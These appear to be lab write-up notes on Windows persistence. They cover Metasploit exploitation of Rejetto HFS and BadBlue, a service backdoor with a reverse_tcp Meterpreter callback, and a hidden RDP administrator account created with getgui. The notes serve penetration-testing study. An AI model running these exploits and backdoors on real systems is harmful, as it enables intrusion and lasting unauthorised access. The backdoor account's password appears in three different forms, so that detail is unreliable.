# üî¨Windows Persistence

## Lab 1 - Service <a href="#lab-1-service" id="lab-1-service"></a>

> üî¨ [Maintaining Access: Persistence Service](https://attackdefense.com/challengedetails?cid=2140)
>
> * Target IP: `10.0.28.44`
> * **Persistence** via services

```bash
nmap -sV 10.0.28.44
```

```bash
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

```bash
service postgresql start && msfconsole -q
```

```bash
search rejetto
use exploit/windows/http/rejetto_hfs_exec
options
setg RHOSTS 10.0.28.44
set payload windows/x64/meterpreter/reverse_tcp
run
```

```bash
sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x64/windows

getuid
    Server username: WIN-OMCNBKR66MN\Administrator
```

* With the `Administrator` Meterpreter session, privilege escalation is not necessary.

### Persistence <a href="#persistence" id="persistence"></a>

‚ùó In order to set up persistence, administrative privileges are required.

```bash
background
search platform:windows persistence
use exploit/windows/local/persistence_service
info
# Description:
#   This Module will generate and upload an executable to a remote host, 
#   next will make it a persistent service. It will create a new service 
#   which will start the payload whenever the service is running. Admin 
#   or system privilege is required.
set payload windows/meterpreter/reverse_tcp
set LPORT 4444 # use a different port than the other session
sessions
set SESSION 1
exploit
```

* Successful maintained access. Once the persistent backdoor is installed, it's going to continue to run (across restarts) as a service and a multi handler listening to a connection will receive a connection from the service.

<figure><img src="../../../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

* Kill all MSF sessions

```bash
exit
# Kill all sessions
sessions -K
sessions
	# No active sessions.
# Close msfconsole
exit 
```

* Regain access to the system

```bash
msfconsole -q

use multi/handler
options
# Set the options as specified for the PERSISTENCE_SERVICE Exploit
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 4444
run
```

<figure><img src="../../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

***

## Lab 2 - RDP <a href="#lab-2-rdp" id="lab-2-rdp"></a>

> üî¨ [Maintaining Access: RDP](https://attackdefense.com/challengedetails?cid=2142)
>
> * Target IP: `10.0.30.1`
> * **Persistence** via RDP and a backdoor user account



```bash
nmap -sV 10.0.30.1
```

```bash
PORT    STATE SERVICE       VERSION
80/tcp  open  http          BadBlue httpd 2.7
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation-1" id="exploitation-1"></a>

```bash
service postgresql start && msfconsole -q
```

<pre class="language-bash"><code class="lang-bash"><strong>search badblue
</strong><strong>use exploit/windows/http/badblue_passthru
</strong><strong>options
</strong>set RHOSTS 10.0.30.1
exploit
</code></pre>

<figure><img src="../../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

### [Enable RDP & New User](https://www.offsec.com/metasploit-unleashed/enabling-remote-desktop/) <a href="#enable-rdp-and-new-user" id="enable-rdp-and-new-user"></a>

* Use the **`getgui`** Meterpreter command to
  * Enable the `RDP` service
  * Create a new user & hide it from Win Login screen
  * Add it to `Remote Desktop Users` & `Administrators` groups

```bash
run getgui -e -u bob -p pass_123321
```

> üìå New user's credentials are `bob`:`password123`

<figure><img src="../../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

* In a new Terminal TAB

```
xfreerdp /u:bob /p:pass_1234321 /v:10.0.30.1
```

<figure><img src="../../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

* The cleanup script provided to remove the added account can be run when the attacker is done with the current system

```bash
# In the Meterpreter Session
run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20230429.4245.rc
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-2c4539fde70ba9b327002701c2325eea27341876%252Fimage-20230429152215357.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=d526ca3&#x26;sv=1" alt=""><figcaption><p>Cleanup script</p></figcaption></figure>
